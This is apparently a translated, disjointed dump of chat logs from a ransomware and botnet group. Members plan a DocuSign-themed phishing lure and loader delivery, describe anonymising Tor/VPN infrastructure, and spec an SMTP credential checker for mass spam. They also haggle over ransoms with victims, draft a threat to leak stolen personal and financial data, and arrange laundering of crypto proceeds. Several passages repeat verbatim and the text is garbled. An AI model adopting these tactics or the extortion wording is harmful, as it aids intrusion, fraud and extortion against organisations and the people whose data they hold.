why the fuck are you leaving us, we're on top terms imho
we can use almost any volume we want
♪ and no shovelnuts ♪
Well, the conditions are top, but everyone's got different nerves. There were 3 of us in the team. 2 of them left for the above reason.
One even at the end of September, appeared, wrote something like "there's a fuckin' hood here" went somewhere off
What can I say? There's an opinion.
Maybe he had some kind of insider tip.
or maybe he's on drugs, I don't know.)
Yes, I think the type of a normal and known for a long time before the trike.
I don't know what's up with him.
Maybe he saved up and thought enough
I'm having trouble with the Internet.
I'll look at the links you sent me on the methods later.
Maybe I'll learn something for myself.
Greetings. .
Hi. .
How many copies do you need?
10 to start.
I usually make copies for myself with different hashes.
1-3к
Okay, I'll do it when you give me the link tomorrow.
But I'd still advise you to protect yourself.
Otherwise you'll get so much slag you'll go nuts.
Hey, what do you know about this guy?
I sent him to you.
joynses@thesecure.biz
[20:21:39] <Hash> And about loader, analogue of what we had once before. It's not only lowader coder you need. You also need a person who makes docks and understands how to "wrap" this looder in the dock. The local docker has no such capabilities.
I've already learned everything there, as I started going back to work.
So I'm stumped on this one.

it will be worse here

they may decide otherwise in Kyiv later
not everything can be controlled there
that is why there were hints with notes under the windshield

Fuck knows what they can do there

talked to someone I know
there are pros and cons
in yua life will no longer be
They asked me to move to Russia by mid-December
it will be worse here
they tolerate here for certain reasons so far
they may decide otherwise in Kyiv later
not everything can be controlled there
that is why there were hints with notes under the windshield
so in December
if you want to come to you
or we'll come ourselves
and we'll settle in.
Okay, it doesn't really matter.

Hi.
&
Is your tracker working?
to the tech guy, copy of the report to max.
===================

gmail autoreg works, but they block the account, saying it was created by the program

Using tshark I record traffic without and with autoreg, compare each packet, analyze the difference in traffic, the volume of conversions is very large, this is business in a nutshell

I didn't upload it to the git, it's all on the server

I was talking to an american guy, and I encouraged him to hack into Google, but he fell off after a week, he got scared.

I think the difference in traffic and its deciphering should give a positive result

I have brought the automation to full perfection, just need to identify and "bite" google tokens

Max17
let's do it on the one with windos
it's on the off line
bentley?
yeah
Or manuel in the rocket.
He's online there.
here?
only the winds servers are ready
do it where the windup is.
another account on linux also gives the same verif
wrote him.
winndows he accepts
with verification he says he can receive sms
Let's try it now.
I did, there is a connection.
Did you look at the lends?
?
Is that a good theme?
Wednesday and Thursday, no problem.
hey, .

What can you change in the tape?
there's another step.
what step
in this tape - everything.
this is a normal html feed
the white window that pops up after you click "Install", you can only change the title, icon, publisher, version
can you make it as an pdf document?
Kind of a document
and pdf document
not a chrome update
Okay, we'll try to do it tomorrow.
I was thinking of doing it in DocuSign format.
also
yeah
fuckin'
DocuSign
really
cool
yeah, i just know it's going well with the corps.
fuck all this paperwork in the morning all day tomorrow they're gonna be warming everyone up for an electronic signature.

and then on Friday we're gonna fuck everybody up.
so i can try to get it together fast tomorrow)
till Friday.
it's gonna be five o'clock.
You have my word.
300-400 units warmed up.
if at least 10-20% will be installed in the system and they do not interfere with any firewalls after clicking

[21:05:42] <hof> it's connected to the hardware of the computer/virtual
[21:06:18] <hof> I think it is one of the most important parameters
[21:06:26] *** hof now Available [50]
[21:07:13] <dgh> In other words we'd better make a devhash in addition to the domain to be sure that there is already the same bot?
[21:07:47] <hof> usually normal bots have original devhash

hi
crunchbase

You got it?
Give me access to it.
We're up and running on Mon.
Operators only warmed up 200 contacts on the sites.
it's not enough.
They're going up
By Friday, they'll be up to 500-800.
By Friday, they'll all be coordinated.
They need to get into work mode

[03:42:31] <blood> working on Mon
[03:42:40] <blood> operators warmed up only 200 contacts by objects
[03:42:42] <blood> not enough
[03:42:44] <blood> are breaking up
[03:42:52] <blood> on Friday they will bring it to 500-800
[03:42:58] <blood> on friday all will agree
[03:43:03] <blood> they need to get into work mode
hello
okay)
just in time to test everything again)\
hahaha))))
not bored there?))
testing
tell Horse
about Mon.
work
tell him to get ready.
no))
although I want to see it in battle
honestly)
Don't worry.
The americans will have time
all this will be over
and there's a question)
a week's worth of work.
we'll see how it's covered)
and fix it all
or smear it)))
they all covered).
i don't believe that they won't cover it in a month
yes they will cover it, of course
the question is how much time it will take)
with the host
I'm asking you to decide
I'm convinced that on the first day
we're gonna run into
with locks on the blacklist.
domain
If it's gone, it's not in the trust.
100%
Okay, I'll look into it this weekend.
What are the options?
Thanks
Well, maybe that's an option.
will solve a lot of
problems
potential
And to be fair.
it's been a long time since anyone fucked an american.
on Twitter about the body attacks
There hasn't been a mention in a long time
anywhere
It's gonna be effective now.
in the next two weeks.
very
and then the briefings again
briefings
staff training
brainwashing
constant rants to everyone inside the company
that there are attacks, don't talk to anyone.
global paranoia.
and you wouldn't want
to smear everything
like, let's do a week's worth of setup
lend
but to have at hand
working version
i'm sure of the opreators.
they were making thousands of loadas targeting 50 ml of revue at the time
before they went on vacation, they made thousands.
♪ and they'll do it now ♪
just to get into the rhythm.
there is room for improvement, but we'll do a test this way, if it goes - already think about how to improve and fuck even more)
ok
♪ if on Mon ♪
they'll be done in an hour
3 landlords
they're all on different domains right?
And hosts.
I don't think they will.
Yeah, on different domains.
But just in case, I'll figure out how to do it over the weekend.
Do you know how much they charge?
And a zero suction.

You want me to tell you?
Three minutes.
Boosa will tell you.
Fucking cloud.
so why else would we be using the bazaar?)
you know what? It's up to you.
why you can't have another bazaar))
i'm not just asking.
))
another one was written.
I understand. I'll take a look this weekend.
10 of them.
What do you want it for?)
spam.
Lives knocking.
Trick works okay.
for spam.
just like it's been working.
))
it's worth it to take a week for the operators to work
any software gets stripped down
and it can be thrown away
to a targeted attack.
you probably haven't seen the time
♪ haven't you seen the time ♪
♪ when it was days ♪
♪ not weeks ♪
weeks to be exact.
in a week
they made the rules.
on certificates
and software
different coders
different coders
different code
methods
only operators worked
in a week or two
could be thrown away
but spammers
have been working for years
but their lojacks
almost shit
why do I have to tell you?
I'm aware of that
if you're interested
like everyone else cares
spam.
Yes, I looked and wondered)
and how much they don't give a crap
for point system attacks
where spam will never make anything go away.
and how...
my word and deed go together?
and conclusions?)
Of course.)
At least that's how it works.
I was told.
bullshit.
it doesn't fucking knock.
30%

by yus.
from spam.
Well, spammers are spammers.
they bring in a penny too
Don't judge them
on the trike is better
You can also attack the coba directly
with it to attack
It'll be better
than on a fancy loafer
tricks' coder is a genius of course)))
but the sessions will fall off
and goodbye bot
there's at least a chance of life to reboot
if something is broken
after a non-stripping action
higher chance
than directly
from a coba
but in essence
the chance from a coba is the same as on a loader ))
for point attacks
with one disadvantage though.
it is higher
session off
and that's it
can't get it back.
really?
why?)))
he wrote a lot of modules for tric
he curates all the new lowers
from dozens of coders
so the bazaar's not that fucked up)
if it's based on what you said)
or it doesn't add up)
I didn't say the bazaar was bullshit.
i understand that it has its own quirks
both the pros and the cons.
trike is a train.
heavy
but it has energy.
and the bazaar
it was purely for the operators
then it was given to the spammers
and it's loaded
heavily
with  modules.
and got a kick in the head
and the base made light versions
coders
they were all killed
booza couldn't take it
and said he wanted to do something else
because everything is too nervous)
tired of the constant destruction)))
that all their creations
ruined).
oh yeah, it's demotivating)
fucked up when the wall you spent a week building is broken down in a couple of hours)
it was a breakdown in the end))
)))
what's he getting paid for?))
and all the people
he has spammers
as an outlet))
like let me work with them)
i said fuck it
and i gave him a break.
i asked him how you were.
He says he's resting.
Thanks, .

"As buza told me, the use of spambot must be coordinated with hash, because there may be a conflict of interest.
I need either you or Ali to contact hash, c buza or Stern and agree on the use of spambot.
I then please let me know which bot will work with spambot. As I understand it, the problem is that the size of the botnet has decreased... Y that's why I ask what bot will work)".

his big day has arrived. 24 hours remaining until the biggest pump signal of all time! The target this time will be around 400% gains possibly even more. We will be targeting $100 million volume. With the bull market being in full effect and volumes being high, the odds of reaching 400% profit will be very high once again. We will do everything in our power to make sure we reach this target, if you have missed our previous big successful pumps, this is also the one you will not want to miss.  A massive pump is about to begin in only 24 hours, be prepared.

Man, the bullshit started that some of the guys are freezing the money and locking the account. Two people so far unsubscribed, I think not the last ...
One had to refund, exchanger locked and froze the money for 3 months, asking for a bunch of documents and an explanation of where the bits came from.
Burana has 4 people so far, + 4 new axintendents at us and 2 coders.
I had almost all of them that I could catch online, tomorrow I will finish all the loose ends and change purses and systems probably just in case

hey bro, i'll be in touch tomorrow and i'll tell you all about it
although no, the server was crooked raid, i put it re-create, there nve 4 disks on 3841GB i re-create them in 10 raid, so the total storage was almost 8tb ... that is 3841GB and 3841GB + 3841GB and 3841GB

and there was essentially nothing, I accidentally noticed when I downloaded to one of these drives that there are 3 more
creation will roughly take 9-10 hours, in the morning put the fill, I changed the pads, there will be more speed to fill, for 4-5 hours I think it should manage

hey bro
 <johnyboy77> i was thinking of banning faer from the host machine altogether. allow only the first virtual machine. it will connect to the VPN and share the internet with the virtual machine which will raise the torus. and the last virtual machine will share it with the working virtual machines

The only thing if you really bother, you need to host a usb modem and a separate VPN, and on the virtual machines the same, you wired everything and from the virtual machine where you will distribute the Internet - another VPN, so they do not intersect

Hey, bro.
 <johnyboy77> i was thinking to forbid faer inet on the host machine at all. allow only in virtualku first. it will connect to ipn and sharing inet with virtualku which will raise tor. and last virtualku will share it already with working virtualkami

normal variant, the only thing if you really bother, it is necessary to host a usb modem and a separate VPN, and on the virtual machines the same way, you wired everything and from the virtual machine where you will distribute the Internet - another VPN, so they do not intersect
Yeah, of course.

my analysis of the ToR
Yahoo/AOL.
===
gmail was kicked out, right?
this is the most interesting material, it is the basis of all development

Mail names are generated based on macros
===
I have a much cooler design

3. captcha is not yet taken into account, we'll take it into account

4. proxy is a weak option, there will be nordvpn or amazon lambdas (as in the cart) in the docker

5. SMTP will take into account

6. create a profile

7. Mailing is done via GET requests for fast mailing of large volumes of 100,000,000, 200,000,000 letters.
===
This is a childish variant - any mail server will kill such activity immediately. This article https://ericdraken.com/headless-chrome-vpn-docker/ describes a working variant - it will be necessary to create thousands of such docker containers and send only 10 letters from each mail account, sent by an AI emulator with mouse movements simulating human ones. Every mailer now has an AI, it recognizes all the movements in the browser, and their AI will just laugh out loud at the get requests to send hundreds of thousands of emails.

8. the point with the authorization by cookie without a password - correct, I noticed it a long time ago when working with stylers, you load a cookie and just log in to the account

9. We put in 1000 accounts and 100 proxies, and these all 1000 accounts are assigned randomly to these 100 proxies with repetition, if there are more proxies, then 1 acre 1 proxy.
===
When you change ip in the ak will immediately begin problems with login, it is better to abandon this option, the ideal option - docker with VPN.

10. Generating PDF files with macros + with wkhtmltopdf

you do not need to do this, the folder can do it from birth

1) we want to create our own crypto system like:

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
Tell us how you do, what success, maybe there are some ideas?

hi
I'm hovering now, I'm interested in trading, defi, blockchain, new projects... There's a return on investment everywhere. And it's kind of boring with everything. I'm sure you'll get your own thing going there too. There's probably a big dream in this thread, not sure if it's necessary but it will be useful for everyone. too many secrets big companies hold on to, thinking it's their main value, these patents and data.

Hi, again, it's up to the 13th. It seemed to us in the morning that we were followed, as in the yard were unfamiliar cars, in the car sit two bodies. So as not to set anyone up, not you and not us. I and Dorirus decided to go into seclusion for a week, all the devices are temporarily in the headquarters apartment. We'll be gone for about a week. It's better to be reassured because our case is extended until November 13. By November 13, everything will be solved, we hope that the case will be dropped. Since it is essentially already impossible to get anything from us. The only thing that bothers me is that the Canadians have a request for 4 Russians. I hope we are not on the list.)
And the lawyers say that until the 13th it is better to sit quietly and do nothing. Live a normal life. And then we'll see what happens.
I warned the guys I work with that I wouldn't be there.
[14:58:01] <mango> Hi there.
Hi
ghbdtn
hi
I'm hovering now, I'm interested in trading, defi, blockchain, new projects... There's a return on investment everywhere. And it's kind of boring with everything. I'm sure you'll get your own thing going there too. There is a big dream probably in this thread, not sure if it is necessary, but it will be useful for everyone. too many secrets of big companies, which they cling to, thinking that this is their main value, these patents and data.
Hey, again, it's before the 13th. We thought we were being followed in the morning, as there were unfamiliar cars in the yard, two bodies sitting in the car. So as not to set anyone up, not you and not us. I and Dorirus decided to go into seclusion for a week, all the devices are temporarily in the headquarters apartment. We'll be gone for about a week. It's better to be reassured because our case is extended until November 13. By November 13, everything will be solved, we hope that the case will be dropped. Since it is essentially already impossible to get anything from us. The only thing that bothers me is that the Canadians have a request for 4 Russians. I hope we are not on the list.)
And the lawyers say that until the 13th it is better to sit quietly and do nothing. Live a normal life. And then we'll see what happens.
I also warned the guys I work with that I won't be there.

Tell me how you're doing, what progress, maybe have some ideas?
THIS MUST BE DONE AT ALL, otherwise your toad will stop working for you

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know it's OK.

I did not mean to step on your toes seems I did not get my message over to you. We do understand the consequences of the situation. That is why we want to negotiate a solution with you! All I was trying to deliver is the message that we are in a tough economic situation and simply cannot pay your demand. I have spoken to my management. They understand the situation and are willing to pay. The money we can afford is 500,000.00 USD. This is a huge amount for us. Please let us fix a deal.
These are the guys you wrote the letter to yesterday

I did not mean to step on your toes seems I did not get my message over to you. We do understand the consequences of the situation. That is why we want to negotiate a solution with you! All I was trying to deliver is the message that we are in a tough economic situation and simply cannot pay your demand. I have spoken to my management. They understand the situation and are willing to pay. The money we can afford is 500,000.00 USD. This is a huge amount for us. Please let us fix a deal.
These are the guys you wrote the letter to yesterday
their price to unlock is $2,000,000.
We need to get them up to 1.5k at least.
Is the social networking bro not ready to translate?
skippy
reply please.
Needed very much.
Hi.)
No, I haven't heard back from him yet.
I think he'll be ready by Mon.
Hi.
I'm here.
Pretty Boy
Hi. .
We've written almost everything here.
How are you?


Can I congratulate you?)
no
Congratulations on what?
Well, if only on the beginning)
well, with the success-payment)
а)
It hasn't been paid yet.
.
They offered us 500,000.
We said no, don't make us laugh with kopecks.
I think we can get it down to 800-1,000.
no more
Well, look at it.
How?)
I think we can get up to 1.5k.
It would be cool
They're really pissed about their date
it's not important to them XD
))
well allegedly yes
))
hello
ahah
let's see)
Yeah.
i'm having a really fucking busy weekend
no rest for a minute.
one minute blogging, the next minute replying.
blogging, blogging, answering.
And motivation is good.
Well, as I understand it, I'm not on the percentage yet.
and will be the salary, and then as the payments will be transferred to the percentage
I don't even know how much the salary is here, they didn't tell me at all
I don't get paid at all at Manco's.)
so i don't know bro, we'll see in a week
just a percentage.
well you have there every week rushes so maybe not enough disk space to store bits)

yeah no

hi. Everything is super good. But watching today. Get your champion friend up and running again.
I have a lot of analytical work to build in.
Made a computing center to set up the whole scheme. That is to say, pushing forward on the immediate areas.
Networked 1 gigabit, put in 2 TB SSDs. Tied the LAN into the home network for automatic transfer of the development to the industrial server.
With this configuration we will quickly see the results. Unfortunately, I didn't have enough energy to write simple routine requests for placing limit or market orders.
But I have worked out a question about retailing stop, when the stoploss will follow the price upwards and fix only the final short of the pound.
This will allow us to raise the percentage much more.
[09:05:32] <mango> hi come on but under your responsibility
if it does not work - you pay me back)))
ok, ready to take the risk )
it is very tasty yum-yum )
but in principle it should be Ok.
worked with the man before

hello - we are going through the process of the committees required to make a decision in this case. as you know we are a government public transport agency and there is not a single person who can make a decision here. can you allow us a couple of extra days beyond the original 6 days you mention? also is there any more discount you can offer on the price because it changes how many decision makers need to approve.
What do they need to put together?
Let me know when you do. I'll explain it to you again.
this needs to be done by everyone or else your toad won't work for you anymore.

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know if it's OK.
Hey bro.
Rocket crashed, looks like the server.
Hi. Troikas on the crypt with a comment, plz when ready.

You can give them one day for example.

I think 1 more extra day will be enough. We think you are a people in a stressful situation, not a turtle.
We are ready to give you a small discount, if you'll be conscious in your behavior. Small discount - don't wait for a serious price reduction.

Hi
Hi
Hi, listen Hof is not interested at all, we need to put someone in his place, tomorrow decide who can replace him, preferably an old one, and replace him with a new one, I mean what Hof did the new one shouldn't do
He will be able to get the detects to work and he will have to do it on his own.
Hi
I've been talking to rocco about the steps of the detec.
We need to move faster to routers.
We found some good dealers who give us clean Ip's.
the only thing you need to do is transfer ipi on both sides of the bot and backend in a get request instead of in the handler, like in tr
otherwise everything will work at once
maybe tomorrow you will also give the coders a hard time
right now the end vpbs are knocking on the intermediate vpbs that dives into the torus to the north
That's the weakest link
it's glowing hard, it's not likely to happen through the rotuers
the script will autoroboot the torus on the intermediate
Hi

This needs to be done by everyone, or the toad won't work for you anymore.

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know it's OK.

Hi
I replied)
any old passwords to the pdf?
No, bro, I don't. If I did, I would've dropped a list in the archive.
Okay.
Don't let him waste his resources.
It's not that important.
I'll check the chat room.
Okay. .
Are you free already?
ok
Are you free yet?
Yeah. .
I'll be gone in an hour or so. I'll change my location.
WARNING. I don't want it to be like yesterday.
Everything okay?

okay

In an hour.
Do you have the old passwords?

ok
I'm gonna go with skippy on the letter to hermer

Why wouldn't he write it?
We've made all the recommendations to protect him, but there's always a weak link in the system - the man.

Fucking skippy, ACNE.
they decided to pay after all?

I guess so.
apparently it's pretty fucking cool.
oh, that's good.
fuck your count turns out to be
ahah
exactly
well that's the biggest deal i got.
if they pay me.
What do you think about HDP?
how would you respond?
I'll see what the date is.
and I'll let you know.
go ahead)
let's bend
now we'll put together a bio for hdp

group soh1 - 10 crypts stanton
group soh1 - 10 crypts stanton
group 25 - 100 crypts (90 panel 10 carrol)

you go ahead)
and I'll adjust
i'll see
bro, i'm still fucking blogging.
I've got a mountain of information to analyze.
Okay. .
but if you don't analyze the date yet.
It's still the beginning of the phase.
now
ready to read?
++
of course
Do you really think that your information (more than 115 GB) is not worth that much money? Personal data of clients, financial statements of the company and so on are no longer interesting for DarkNet? I think you are wrong. But we can always check it by posting your information on our blog and notifying Internet news agencies. I think the courts and competitors will quickly let you know about yourself.
Well, drink up, please.
or overdrink)
no
I like it.
All right. .
Okay. .
I'll talk to Trump about it.
Go to .

[Error: message is encrypted and cannot be decrypted.]
no way bro
ahah, i'm not a fucking business coach, but fuckin' get it right
))
ahhh
i work till 2 a.m. all the time. i start at 8 a.m. in the morning.
that's not right.
you can't
well, i can't do it any other way
come on
well, i don't know.
he throws me a task at 1:00 in the morning and says I have to do it.
What should I do?)
You gotta do it, bro, or they'll throw me out, and I'll be fucked.
This is the first time I believed that dreams can come true
i told right away that i don't give a fuck working from 3 till midnight)
when I got the job
ahah
they can, bro.
well no one asked me and secondly they said as long as they look at me
you're going to get it...

Well, close it all up there.
Yeah, I'm trying.
Watch this.
A couple of lams on top.
for insurance.
[20:36:25] <bio> also please, while you're here - how are you tomorrow, weekend?
[20:37:18] <bio> if you don't mind, I'm off tomorrow morning, hours 9:30 - 4:00, then off and on Sun - from 2:30 and all the way. Would you approve?
[20:38:14] <bio> yeah, by the way, lemon got transferred there, have you seen it or not?

while I have to leave for the weekend
Oh shit!)
and for 0.5% thank god
so when you say write - bro no problem, not as nice as you, but I can. but just stupidly no time to even get into it.
you watch

I'm looking at .
Trump knows I'm not here forever.
I'm going to make Lam-2 bucks
♪ and then I'm gone ♪
You're gonna stay here

♪ and if it keeps going like this, you're gonna get fucked up ♪
Yeah, I know.
but hopefully we'll change the condition
later
i'm planning on getting that much too and then i'll probably quit.
i don't need much))
Yeah, that's for sure.
It's just that...
Let me get this straight.
i used to fuck around like this
24 hours a day
I thought about quitting halfway through
now it's a little different, i can quit whenever i want
I just want more money.
I don't think you're gonna quit, bro.
and then it's fucked up, when you're sitting there, the bulb doesn't work.
no fuckin' growth
you'll fuck it up real quick
i'll quit
because I'm scared.
i have two kids
and it's easier for me to have a cushion and a business.
You're not the only one.
than to sit around and take risks.
That's right, bro.
Can't argue with that.
I know opportunity breeds need.
but fuck!
))
don't tell that to tramp.)
or he'll be offended.
his ass is worth more)
he knows.
I agree
I told him.
i've been working with him for a long time as it turns out

before this thread.
well, yeah.
 he did.
except I don't know where he's coming from
and you know what's weird?

i used to write him letters
♪ for 40, 60 bucks a pack ♪
♪ when I wrote him an open toad ♪
I was added to his account.)
and he's the fuck out of where.
Small world.)
it is.
i even have a dareev in my trolley.
All right bro, did you tell tramp I wrote a letter?
we already sent it
Yeah. .
Of course. .
I guess he didn't believe it, huh?

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do it, let me know if it's OK.

Our contact person in Russia can confirm and explain, that your attack seriously affects companies in Russia, that are very important for the local critical infrastructure.
Our contact person can validate this for you.
We can make this contact available to you.

Hi. Yes.

new in general we have 9 people for today
4 osints and 5 coders
and separately, there's also a team on tox who's boozing there, but I've only met 1 person so far
We don't understand each other... You wrote that they need to give the grid to work, he wrote that he even need three) And on what terms, too, I do not understand, gave him your contact here, said he will write you back
[Error: Message encrypted and can't be decrypted.]
Yeah.
Well maybe he should get the contact.
On what terms should I give him the triple?
I wrote him that we usually take part of the bots with nets, but what part I do not know))
say 20 percent
let's try there
20% of the bots with nets are ours
ok
I'll be out of here for 20 minutes
Okay. .
20 percent not bots but profits
Let them work it out on their own.
You didn't give him any nets yet?
I gave him a bunch of pulses, he couldn't do anything with them.
I'll try to give him some nets.
I'm sick for a week, then I have to go home...
so I'm not really working...
fuf gj
Yeah, I got it.
Cheer up.
send the btz, I'll get it done soon.
yeah
ok
i did not find any russian companies that would cooperate with them, but maybe some small ones are, it would be nice to understand what they are without their help. or what do you think?
Do you know if they gave you salaries?

Hi
I have a favor to ask of you. I have a problem with my host right now and he can't pay me the check. You can pay for 2 koba: 1 server-101 $ (the second is already paid). 2 pads-$20. 2 domains- 30 euros. This is all from rocco. It's just that he has problems with the system. and I lose time while he solves the problem. Okay?

Hello, dear friend.
[Error: message encrypted and impossible to decrypt.]
I can't find our Rozetka.
It disappeared somewhere...
You wouldn't happen to know?
[Error: Message encrypted and impossible to decrypt.]
[22:46:44] <22> 500 I asked for that week in advance.
[22:46:54] <22> drop 1500
[22:47:07] <22> for that 500 and this 1000 .... << let's work it out.
right.
Tell me how you're doing, what's the progress, maybe you have some ideas?
THIS MUST BE DONE AT ALL, otherwise your toad will stop working for you.

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know it's OK.

I'm preparing a list for you to call...although I don't understand why.
Listen, awkward question)

I came to St. Petersburg to yell, but forgot my leger at home
What do you mean you don't understand?)
if we can get the blog up.
Trump wants to take it to the post office.

Yeah
I sent the mail to the fourth.
Well then he will tell me what's up.
0 answers
yes
bro, i can only give you 1500k tonight
I have cats on my other laptop
I've got some for now.
Tonight's the night.
Well, you can ask tramp for more.
I'll send it to you on Mon.
Not .
I don't want to.
If you're an enlisted man.
What?
He's the boss, after all.
Okay.
Thank you very much.
We'll decide tonight.
No problem.
Okay.
I'm already clean.
Wow, cool.
I don't even have to wash them.)
no
100%
super
clean everything
great
I'll be home around 6 pm Mon.
Well, if you're gonna give me the dirt back, then a little more, because I'm losing 3%.
I'll get it back.
Nah, clean, too.
Okay. .
I can even send it to you.
Let me give you USDT, and you pay me back in USDT
Would that be okay?
I'll see what kind of a cat I can do with them.
instead of

obligatory with trc20
re
or else trouble with the commission
ahah, shit!

Anyway, in the evening.
not long, but the commissions are
creepy

[10:50:31] <skippy> Listen, awkward question.)
can i borrow 1500 usd from you till monday?
i came to peter to yell, and i forgot my leger at home

bc1q6gj8ymnjh863gmuvh2nc3462trrvzlxf2atzxn
♪ throw it in the rocket ♪
can you do that?
sec
sure
Okay.
Tell me when you get it.
already)
Okay. .
I'll translate it and let you know.
Okay.)
Thank you so much.
Check out .

No problem, bro!
It's not showing up yet.
If it's an exchange, it doesn't come right away
Binans, for example, only after the first confirmation
Well usually it's quick
minutes
yes, I know)
5-10
admin doesn't work, nothing to do at all yet
unusual so
Well, yes, on the exchange can not put a fee for the transfer. it itself there exposes.
by the way
found myself a leger
i'll buy it tomorrow
cool)
but the fucking price is three times what it's worth.
which one?
X
okay)
Why is it more expensive?
Bitch local dealers
at dns 15k.
300$
Well, maybe it went up.
That's the price they charged me.
No. .
I looked it up on their website.
And they don't want to haggle at all.
Bro, it's easy, right? I can handle it?
You know what I'm afraid of? That it won't fuck up.
Well, I figured it out on the fly.
Why are you scared?
or else it's the end of the bitcoins.
i don't know what it is yet, i haven't felt it in my hands
I usually use bitcoin core.
it's reliable.
and fast transfers
Anyway, check it out.
and recovery
when you create a cat.
they give you a syd
well, 24 words
you just keep them safe
you can recover if anything on any Ledger
ahhh, is it always given there on the fly?
It's just a key.
Yeah, when you create a wallet.
Like in electrum.
I thought there wasn't a SID.
Oh, I see.
Great.
there is)
Otherwise no one would take them.
and i can restore it on any Ledger?
Yes
well at least on x
i.e. you have to buy another one then)
s probably too.
Well, I only found the X in my place.
I got it, thanks bro. If I get one tomorrow, I'll share my impressions)
Did you get the funds?
Not yet.
I'm just gonna check the blockchain now.
Check .
No, the exchange hasn't given it to me yet.
https://blockchair.com/bitcoin/address/bc1q6gj8ymnjh863gmuvh2nc3462trrvzlxf2atzxn
the exchange is really fucked up
Exmo, man.
but it charged me instantly
No.
they all are.
Are there any confirmations?
Let me see.
It says paid and transaction number.
Nothing else.
transaction number is a hash?
11252367
а

So we wait for the first confirmation.
After that, they usually let her go.
Yeah, I guess so.
Why exmo and not binans?
I honestly don't have much experience
Binance fucks up a lot.
I've never had one.
that's why exmo
Well, maybe it just worked out.
I've been working with them for over a year.
I don't deal with exchanges much.
I usually put bitcoins in there and take usdt out.
well, yes)
Usually 3-5 minutes and the usdt is already with the person
I do it through bestchange
and bitcoin has never withdrawn or transferred at all
Bestchang has a high percentage
they have instant confirmations)
I transferred $1000 and one percent to the guy and he paid me cash.
Yeah, that's great.
Cash is always cash.
Yeah, found one.
Super.)
Said up to 100 grand, no problem.
100k rubles?)
You only need a day's notice
or normal
no dollars
ah, well, that's right
I've got up to 100k wood a day limit on people
but that's a fuckin' lot.
I crossed paths with him three times in person.
I've taken 10k out so far to pay off half the credit
each time in a new car
haha

not
he's fucking crazy.
I got a guy who says you gotta translate it for me in advance.
That's what I do too
and I'll come and give you the money later))
We only worked on the spot the first time
Now I'm transferring so I can just come and get it without waiting.
Yeah, it's my first time too... well, that's fine by the way
They don't have the sense to bail
If they do, I don't know what to do.
I can only ruin my reputation
I have a small village) found out where he lives
if anything, I'll catch him anyway)
ahah
Exactly!)
Reputation means a lot in this business.

Yes
It turns out we only have three of them.
Two guys and a girl.
and everybody knows them.
I'm so fucked up.

Listen, still no transfer from the exchange.
No, nothing yet.
Shit, I wish I could get it transferred by tonight, otherwise you'll be sitting there with no money.
Ask for a hash.
Yes, I think they will.
Well, I've got some.
I don't know how to ask for a hash
I have it in my phone.
30-35к
enough for today
rest)

[Error: the message is encrypted and cannot be decrypted.]
Input data:
1. list of validated emails - text file
2. list of address:port SOCKS4/SOCKS5 servers - text file
3. list of test emails - email password - text file
4. list of test message templates - text file
5. test timeout
6. number of test threads

WORKFLOW
7. validate the email (criteria in the appendix)
8. get DNS MX records for domain from email
9. get/generate all possible port/MX/SSL/TLS and other SMTP extensions for security and authentication
10. for each of the options p.9 try to open a connection through a randomly chosen socks-server (p.2) and authorize by the available email and password.
If authorization is successful, send a test letter (item 4) to the test mailbox (item 3).
We put the given tested email and the current time to the pending list (those for which the result is expected).
These checks are performed in several threads, the tested list is divided accordingly.
11. a separate thread checks the test mailboxes (item 3) by the IMAP/POP3 protocol.
From: all incoming emails are compared with the emails from the pending list. If they match, it means the sending through the given account works.
Such email is added to the pending output list.
If there was no incoming mail from the account during the timeout (item 5), such email is entered into the timeout list.
In all other cases the email is marked as unusable.

REQUIREMENTS
12. Working under Linux operating system.
13. Implementation language - preferably Python, other options are discussed.
14. The general aspiration of the checker should be to reduce scanning time. As many scans per unit time as possible - taking into account multithreading or whatever.

hi
payment came.
the whole thing?
I only saw part of it.
750
Well, we're waiting for the second part.
250 ?
Yeah.
okay
So far, the bitches aren't talking.
I texted them at 4:00 a.m.
and they still don't say anything.
Look at what the bank threw out
give me your opinion please
Yeah, I saw it.
It's okay.
It's fine.
They don't want to pay much but they have to.
It's just beautiful to understand them.
increase your offer 5 times
everything
yes the bank will give 3-4k
I think so too
next time say 50% off
of the total amount
And that's the edge
edge
Considering that you don't need a cryptor
no you just need to write for example the price for you 3700% is 50% more of the price but this is the extreme price if you want to negotiate pay
I don't get it))
but okay.
Oh, shit!
busy
you can write later if you want to hear our extreme offer is 3700
Trampych, today at about 17.15 I'll leave and be there tonight, around 21.00
We can't go any lower than that unless we go public.
Skippy'll cover for me.
Okay. .
Okay. .
Yeah, got it.
But I'm thinking no lower than 4k.
You can do 4k.
write
Even better
Okay.
they will raise the price later
and we'll meet somewhere around 3.5
Maybe.
you have experience you know better
Eh, I was betting on them to pay more than 5k.)
Who's the one who's supposed to be on the phone today?
deciding to fix his software
tomorrow he'll give us new builds and we'll start targeting again
yes they should
there will be a new arrival
